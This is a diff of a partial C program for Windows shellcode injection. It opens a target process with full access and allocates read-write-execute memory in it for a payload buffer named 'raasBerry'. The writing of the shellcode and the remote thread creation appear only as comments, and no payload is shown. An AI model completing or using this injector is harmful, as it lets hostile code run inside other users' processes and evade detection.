@@ -2,6 +2,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+//macros
+
+const char* k = "[+]";
+const char* e = "[-]";
+const char* i = "[*]";
+
 DWORD PID = NULL; 
 HANDLE hProcess = NULL;
 HANDLE hThread = NULL;
@@ -26,22 +32,19 @@ int main(int argc, char* argv[]) {
     if (*endptr != '\0') {
         return EXIT_FAILURE;// Handle the error: argv[1] is not a valid integer
     } 
-    hProcess = OpenProcess( //open handle to process pid
-        PROCESS_ALL_ACCESS,
-        FALSE,
-        PID
-    );
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID );//open handle to process pid
+    printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);  // comment me
+
     if (hProcess == NULL) {
-        //GetLastError();
+        printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());  // comment me
         return EXIT_FAILURE;
     };
 
 // Allocate a buffer in the process memory with the necessary permissions
 
-    VirtualAllocEx(hProcess, NULL, ){ //Extended version
+    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(raasBerry), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); 
+    printf("%s allcoated %zu-bytes with rwx permissions\n", k, sizeof(raasBerry)); // comment me
 
-    return EXIT_SUCCESS;
-    }
 // Write the contents of the shellcode to that buffer in the process memory
 
 // Create a thread that will run in allocated memory and written into the process
